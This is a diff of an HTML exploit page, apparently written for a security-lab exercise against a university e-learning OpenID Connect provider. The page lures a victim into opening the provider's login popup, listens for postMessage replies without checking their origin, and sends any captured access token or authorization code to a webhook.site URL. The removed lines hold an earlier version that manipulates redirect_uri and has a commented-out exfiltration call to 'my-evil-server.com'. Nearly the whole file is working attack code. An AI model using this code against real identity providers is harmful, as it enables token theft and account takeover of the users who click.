@@ -1,64 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Malicious OIDC Exploit (Raw Text)</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 1em;
-    }
-    #tokenLog {
-      margin-top: 1em;
-      padding: 1em;
-      background: #f0f0f0;
-      border: 1px solid #ccc;
-      white-space: pre-wrap;
-    }
-  </style>
+  <meta charset="utf-8" />
+  <title>Malicious OIDC Exploit</title>
 </head>
 <body>
   <h1>Malicious OIDC Exploit</h1>
-  <p>
-    When the victim clicks below, we open the IdP’s login flow. If they’re already
-    logged in, the IdP might immediately post the token/code back to this page
-    via <code>window.postMessage</code>.
-  </p>
-  <button id="stealTokenBtn">Steal the Victim’s Token</button>
+  <p>Click the button to continue!</p>
 
-  <h2>Captured Token/Response:</h2>
-  <div id="tokenLog">(none yet)</div>
+  <button onclick="startExploit()">Login (Malicious)</button>
 
   <script>
-    // Change this URL to match the *exact* vulnerable flow request:
-    const authorizeUrl = 
-      "https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?client_id=spa-1&redirect_uri=https%3A%2F%2Fsp%2Delearning%2Ecloud%2Ends%2Erub%2Ede%3A443%40https%3A%2F%2Fsp%2Delearningcloudndsrubde%2Evercel%2Eapp%2F&response_mode=web_message&scope=profile+email+calendar+passwords+photos&response_type=token&state=97e5fb7b-561d-4ee8-89ad-d350bc730c59&skip_prompt=1&idp_verifier=spa-a5";
+    // Replace with the real (unmodified) "authorize" URL from your scenario.
+    // You can add or tweak parameters like "state" or "nonce" if they are not blocked.
+    // Just be sure NOT to change redirect_uri or the restricted parameters.
+    const idpAuthorizeURL = `https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml
+      ?scope=profile+email+calendar+passwords+photos
+      &response_type=code
+      &redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify
+      &state=ATTACKER_CONTROLLED_STATE_VALUE
+      &code_challenge_method=S256
+      &client_id=spa-1
+      &code_challenge=VJU3RVuzgLG6-KhPrcOV3wk2llSR-Gk0hgqjPcGFNt0
+      &response_mode=web_message
+      &idp_verifier=spa-s1
+    `.replace(/\s+/g, ''); // remove line breaks and spaces
 
-    // Open the IdP flow in a new window.
-    document.getElementById("stealTokenBtn").addEventListener("click", () => {
-      window.open(authorizeUrl, "_blank", "width=800,height=600");
-    });
+    function startExploit() {
+      // 1) Open the IdP's login in a new popup window (can also use an iframe if needed).
+      const popup = window.open(
+        idpAuthorizeURL,
+        'loginPopup',
+        'width=600,height=800'
+      );
 
-    // Listen for any postMessage events (the IdP might send the token here).
-    window.addEventListener("message", function (event) {
-      console.log("Got a postMessage event:", event);
+      // 2) Listen for the token/code via postMessage.
+      //    Because the IdP is vulnerable and does not properly verify the recipient origin,
+      //    we can receive the message here.
+      window.addEventListener('message', function(evt) {
+        // Check the message event.
+        // NOTE: If the IdP does not check 'origin' properly, we might get the code/token here.
+        // If you want to filter by the IdP’s domain, you can do so. But in a true vulnerability,
+        // the IdP incorrectly sends it to *any* origin or incorrectly verifies it.
 
-      // Optionally check event.origin here, if needed:
-      // if (event.origin !== "https://idp-elearning.cloud.nds.rub.de") {
-      //   return;
-      // }
+        console.log('Received message:', evt);
 
-      // Just show the raw data, no JSON parsing:
-      const tokenLogDiv = document.getElementById("tokenLog");
-      tokenLogDiv.textContent = "Received message:\n" + event.data;
+        // If the message from the IdP includes code or token in evt.data, capture it:
+        if (evt.data && evt.data.access_token) {
+          // 3) We have stolen the access token - do something malicious, e.g. exfiltrate
+          const stolenToken = evt.data.access_token;
+          console.log('Stolen Access Token:', stolenToken);
 
-      // If we wanted to exfiltrate it to our server:
-      // fetch("https://my-evil-server.com/steal", {
-      //   method: "POST",
-      //   headers: { "Content-Type": "text/plain" },
-      //   body: event.data
-      // });
-    });
+          // Exfiltrate to attacker’s server
+          fetch('https://webhook.site/38cf651e-7639-4396-bb48-92b21a547ba2?token=' + encodeURIComponent(stolenToken));
+
+          // Optionally close the popup
+          popup.close();
+        } else if (evt.data && evt.data.code) {
+          // If the IdP returns an authorization code instead of an access_token:
+          const stolenCode = evt.data.code;
+          console.log('Stolen Auth Code:', stolenCode);
+
+          // Exfiltrate to attacker’s server
+          fetch('https://webhook.site/38cf651e-7639-4396-bb48-92b21a547ba2?code=' + encodeURIComponent(stolenCode));
+
+          popup.close();
+        }
+      });
+    }
   </script>
 </body>
 </html>
